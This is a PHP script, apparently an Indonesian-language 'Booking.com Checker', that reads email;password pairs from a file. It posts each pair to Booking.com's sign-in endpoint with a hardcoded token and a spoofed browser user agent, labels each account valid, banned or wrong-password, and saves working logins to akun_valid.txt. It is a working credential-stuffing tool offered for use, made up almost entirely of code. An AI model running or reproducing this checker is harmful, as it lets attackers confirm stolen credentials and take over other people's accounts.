<?php
/**	
 * @author eco.nxn
 */
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
class curl {
	private $ch, $result, $error;
	
	/**	
	 * HTTP request
	 * 
	 * @param string $method HTTP request method
	 * @param string $url API request URL
	 * @param array $param API request data
     * @param array $header API request header
	 */
	public function request ($method, $url, $param, $header) {
		curl:
        $this->ch = curl_init();
        switch ($method){
            case "GET":
                curl_setopt($this->ch, CURLOPT_POST, false);
                break;
            case "POST":               
                curl_setopt($this->ch, CURLOPT_POST, true);
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $param);
                break;
            case "PATCH":               
                curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "PATCH");
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $param); 
                break;
        }
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0');
        curl_setopt($this->ch, CURLOPT_HEADER, false);
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 20);
        $this->result = curl_exec($this->ch);
        $this->error = curl_error($this->ch);
        if($this->error) {
            echo "(!) Connection Timeout\n";
            sleep(3);
            goto curl;
        }
        curl_close($this->ch);
        return $this->result;
    }   
}

class bookingcom extends curl{

    function random($length)
    {
        $data = 'qwertyuioplkjhgfdsazxcvbnm0123456789';
        $string = '';
        for($i = 0; $i < $length; $i++) {
            $pos = rand(0, strlen($data)-1);
            $string .= $data{$pos};
        }
        return $string;
    }

    function check($email, $password, $client_id) { 

        $method   = 'POST';

        $header[] = 'Content-Type: application/json';
        $header[] = 'X-Requested-With: XMLHttpRequest';

        $endpoint = 'https://account.booking.com/account/sign-in/password';
        
        $param = '{
            "login_name": "'.$email.'",
            "password": "'.$password.'",
            "client_id": "'.$client_id.'",
            "state": "",
            "scope": "",
            "code_challenge": "",
            "code_challenge_method": "",
            "op_token": "EgVvYXV0aCKNBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qrARVcDREUFZVbGQ4MUFaZU1mb2NFdFBSelhYQzBkRG9mNVl5dmJWaG5lS0tadGhuYUhBRFNKT0U2MGtaRHRKcy1XRzVXSHFTaXR4QmZ1VVBYMy02X3lJNC1kTEoyV0hIWXNmcDZrLWFiMlNKRGltUE1DaTE2S0NrZjNQM3R6Q1lvejJBN0dGQTRva0pHM2NLeElDLVlUT21NQk1aSzUtVEpGWElUVDQwclZlOERZRWpxNGxXaUFVUXVlUlJaOUo2SmhCdDhGbWdETW9BaTAtU1JIdWdiVWg3NTlrSWhrcDVsc2tXSXBseXJDZ3dIaFhoLXB4WGVrZlFMWFNBSXd2Tllkd291VDhDQmlHTVA2MHBhV3lmdWlTZnhVWUlkV2lobkd2QlkwWTN2RWNraWRkci1JM2RHZDVrRC1sVHNQOU9kLUExX2ZjaEkwcFZSUkZjdUo0TnJTallJUVZkd2Q0eXJ4MjZXb3VOM1g1UE9MdjhEQ2lZRFJidW14alg2dFZfR0JnRl9XSHM3bGNjUVdWNFNrby1yR3Nzb19UYmlVNXRud1JuTUFNTm56LUUzaF91TmN0b3RYMm96b09RSEdnZFo2OVFMOEFZY25qS2t0anRjVklFRlBfNGgzY1ZqeHhUWnR6Ry1TZG5odk9RbU0yN21mR0ZLcjR4OUNFam55bnJqa3hZM20wd2pHdFg3TjV5aGQ4VkIxbDFLbktaTFVsSUtSM2dtcGVETm9JWG43QgRjb2RlKg4IjsgSOgBCAFiJzuz3BQ"
        }';
        
        retry:
        $check = $this->request ($method, $endpoint, $param, $header);

        $json = json_decode($check);
 
        if($json->next_step == 'redirect') { 

            $file = dirname(__FILE__)."/akun_valid.txt";
            if(file_exists($file)) {
                unlink($file);
            }

            $fh = fopen($file, "a");
            fwrite($fh, $email.";".$password);
            fclose($fh);

            return $email.". AMAN BRO\n";
            
        } elseif ($json->next_step == '/account-disabled') {
            return $email." BANNED\n"; 
        } elseif ($json->errors[0] == 1203) {
            return $email." SALAH PASSWORD\n"; 
        } else {
            echo "[!] UNKNOWN ERROR: ".$check."\n"; 
            sleep(2);
            goto retry;
        }       
    }
}

/**
 * Running
 */
// style 
echo "\n"; 
echo "   ___   ____   _____ ____   __  ___\n";
echo "  / _ ) / __ \ / ___// __ \ /  |/  /\n";
echo " / _  |/ /_/ // /__ / /_/ // /|_/ /\n"; 
echo "/____/ \____/ \___/ \____//_/  /_/\n";  
echo "Checker               by @eco.nxn\n";
start:
echo "\nPut your account in akun.txt (format: email;password)\n";

$bocom = new bookingcom();

echo "Enter...";
trim(fgets(STDIN));

$file = dirname(__FILE__)."/akun.txt";

if(file_exists($file)) {
    $list = explode("\n",str_replace("\r","",file_get_contents($file)));
    
    $no=1;
    foreach ($list as $value) {

        if(!is_numeric(strpos($value, ';'))) {
            echo "(!) Format harus email;password\n\n";
            die();
        }

        $account = explode(";", $value);
        $email     = $account[0];
        $password  = $account[1];
        $client_id = $bocom->random(16);
        
        $check = $bocom->check($email, $password, $client_id);

        echo "[".$no++."] ".$check;
    }

    echo "\n(i) Your valid account has saved in akun_valid.txt\n\n";
    

} else {
    goto start;
}

